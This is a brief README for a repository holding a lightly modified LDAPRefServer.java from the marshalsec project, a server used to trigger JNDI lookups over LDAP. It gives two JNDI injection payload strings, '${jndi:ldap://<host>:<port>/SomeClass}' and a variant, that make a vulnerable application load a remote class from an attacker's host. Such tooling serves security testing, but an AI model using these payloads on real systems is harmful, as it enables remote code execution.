# LDAPRefServer

This just contains the LDAPRefServer.java from [mbechler/marshalsec Github Repo](https://github.com/mbechler/marshalsec/tree/master), required to trigger a jndi lookup via LDAP.

Just made a minor tweak so that the lookup is done like: 
 ```
${jndi:ldap://<host>:<port>/SomeClass}
 ```
As opposed to:
```
${jndi:ldap://<host>:<port>/#SomeClass}
```
